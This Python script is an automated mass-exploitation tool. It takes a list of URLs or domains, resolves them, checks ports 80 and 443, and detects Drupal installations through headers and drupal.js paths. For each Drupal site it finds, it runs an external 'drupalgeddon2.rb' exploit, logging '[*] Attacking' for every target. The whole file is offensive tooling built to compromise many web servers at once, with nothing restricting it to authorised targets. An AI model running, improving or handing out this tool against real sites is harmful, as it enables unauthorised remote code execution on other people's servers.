#!/usr/bin/env python3
# -*- coding: utf8 -*-
import json, sys, argparse, collections, requests, threading, os, uuid, subprocess, dns.resolver, queue, socket
from urllib.parse import urlparse
from random import shuffle


# Global actions
requests.packages.urllib3.disable_warnings()

# Global vars
nb_processed = 0
nb_threads = 10
useragent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'
# Global lock for counter
threadLock = threading.Lock()

##################################################
# Thread class
##################################################
class CrawlerThread(threading.Thread) :

    def __init__(self, queueUrls, tid) :
        threading.Thread.__init__(self)
        self.queueUrls = queueUrls
        self.tid = tid


    ##################################################
    # Run baby run!
    ##################################################
    def run(self) :

        global nb_processed
        global useragent
        
        # Always run until its queue is empty
        while True:

            url = None

            try :

                # Get element in queue
                url = self.queueUrls.get(timeout=180)
                sys.stdout.write('[*] Input for worker %s\n' % url)
                sys.stdout.flush()

                isdrupal = False

                r = requests.get(url, verify=False, timeout=30, headers={'User-Agent': useragent})
                realurl = urlparse(r.url).scheme + '://' + urlparse(r.url).hostname + '/'

                # Looking for drupal website
                for key in list(r.headers.keys()) + list(r.headers.values()):
                    if 'drupal' in key.lower() or 'drupal' in str(r.content.lower()):
                        isdrupal = True
                        break
                
                if not isdrupal:
                    r = requests.get('%smisc/drupal.js' % realurl, verify=False, timeout=30, headers={'User-Agent': useragent})
                    if r.status_code == 200 and r.headers.get('content-type') == 'application/javascript' and r.content and 'drupal' in str(r.content.lower()):
                        isdrupal = True
                    else:
                        r = requests.get('%score/misc/drupal.js' % realurl, verify=False, timeout=30, headers={'User-Agent': useragent})
                        if r.status_code == 200 and r.headers.get('content-type') == 'application/javascript' and r.content and 'drupal' in str(r.content.lower()):
                            isdrupal = True

                if isdrupal:
                    # Run bash command
                    my_env = os.environ.copy()
                    my_env['NODE_NO_WARNINGS'] = '1'
               
                    sys.stdout.write('[*] Attacking %s\n' % realurl)
                    sys.stdout.flush()

                    bashCommand = './drupalgeddon2.rb %s' % realurl
                    process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=my_env)
                    output, error = process.communicate()

                    sys.stdout.write(output.decode('ascii')+'\n')
                    sys.stdout.flush()
                    sys.stdout.write(error.decode('ascii')+'\n')
                    sys.stdout.flush()

                # Stats about the number of urls processed
                with threadLock:
                    nb_processed += 1
                    
                if nb_processed % 1000 == 0:
                    sys.stdout.write('[*] %s urls crawled\n' % nb_processed)
                    sys.stdout.flush()

            except queue.Empty:
                return

            except Exception as e:
                pass
                # sys.stdout.write('[!] %s\n' % e.message)
                # sys.stdout.flush()

##################################################
# main procedure
###################################################
def main(argv):

    global nb_processed
    global nb_threads
    ###################
    # parse args
    ###################
    parser = argparse.ArgumentParser(description='Launch a multithreaded web crawler')
    parser.add_argument("-f", "--file", dest="urlsfile",help="file with urls")
    args = parser.parse_args()

    if(not args.urlsfile):
        parser.print_help()
        sys.exit(1)

    with open(args.urlsfile) as urls_file:

        urls = urls_file.read().splitlines()

        # shuffle input urls
        shuffle(urls)
        
        queueUrls = queue.Queue()

        sys.stdout.write('[*] Processing %d lines\n' % len(urls))
        sys.stdout.write('[*] Launching %d threads\n' % nb_threads)
        sys.stdout.flush()

        ###################
        # Creating threads
        ###################
        for i in range(1, nb_threads+1):
            worker = CrawlerThread(queueUrls, i) 
            worker.setDaemon(True)
            worker.start()
    
        ###################
        # Pushing urls onto queue
        ###################
        for url in urls:

            # Allow to comment lines
            if not url.startswith("#"):
                hostname=urlparse(url).hostname

                # If hostname is None, we have a domain as input, not an url
                if not hostname:
                    hostname=url

                if is_ipv4(hostname) or dns_resolve_A(hostname):

                    if not urlparse(url).hostname:
                        # We are detecting the right scheme
                        for found_url in domain_to_urls(hostname):
                            sys.stdout.write('[!] debug: adding %s\n' % found_url)
                            sys.stdout.flush()
                            queueUrls.put(found_url)
                    else:
                        sys.stdout.write('[!] debug: adding %s\n' % url)
                        sys.stdout.flush()
                        queueUrls.put(url)
                else:
                    sys.stdout.write('[!] No dns resolution for %s\n' % hostname)
                    sys.stdout.flush()

        #queueUrls.join()

        ###################
        # Joining threads
        ###################
        main_thread = threading.currentThread()
        for t in threading.enumerate():

            if t is main_thread:
                continue
            #print 'joining %s' % t.getName()
            t.join()

        # All threads have consumed their queue
        sys.stdout.write('[*] Total of %s urls crawled\n' % nb_processed)
        sys.stdout.write('[*] Done\n')
        sys.stdout.flush()


###################################################
# send a DNS type A request
###################################################
def dns_resolve_A(domain):

    try:
        return dns.resolver.query(domain, 'A')
        # We are returning the first ip address found
        # return str(answers_IPv4[0].address)
    except Exception as e:
        return None


###################################################
# is an IPV4 address?
###################################################
def is_ipv4(input):

    try:
        socket.inet_aton(input)
    except socket.error:
        return False

    return True

###################################################
# Find if the final redirection of scheme http/https
# is the same
###################################################
def domain_to_urls(domain):

    global useragent
    response_http = None
    response_https = None

    try:
        if isopen(domain,80):
            sys.stdout.write('[*] port %d open on domain %s\n' % (80,domain))
            sys.stdout.flush()
            response_http = requests.get('http://%s' % domain, verify=False, timeout=30, headers={'User-Agent': useragent})
    except Exception as e:
        pass

    try:
        if isopen(domain,443):
            sys.stdout.write('[*] port %d open on domain %s\n' % (443,domain))
            sys.stdout.flush()
            response_https = requests.get('https://%s' % domain, verify=False, timeout=30, headers={'User-Agent': useragent})
    except Exception as e:
        pass

    # Testing if both requests match, or one of them
    if response_http and response_https:
        if response_http.url == response_https.url:
            return ('https://%s' % domain,)
        else:
            return ('http://%s' % domain,'https://%s' % domain,)
    elif not response_http and response_https:
        return ('https://%s' % domain,)
    elif not response_https and response_http:
        return ('http://%s' % domain,)
    else:
        return ()

def isopen(hostname, port):
    """
    Connects to a given hostname and port.
    """
    connected = False
    socket.setdefaulttimeout(5)
    try:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((hostname, port))
        connection.close()
        connected = True
    except ConnectionRefusedError as e:
        pass
    except socket.timeout:
        pass
    return connected
    
###################################################
# only for command line
###################################################
if __name__ == '__main__':
    # if os.geteuid() != 0:
    #     sys.exit('You need to have root privileges to run this script.')
    main(sys.argv)
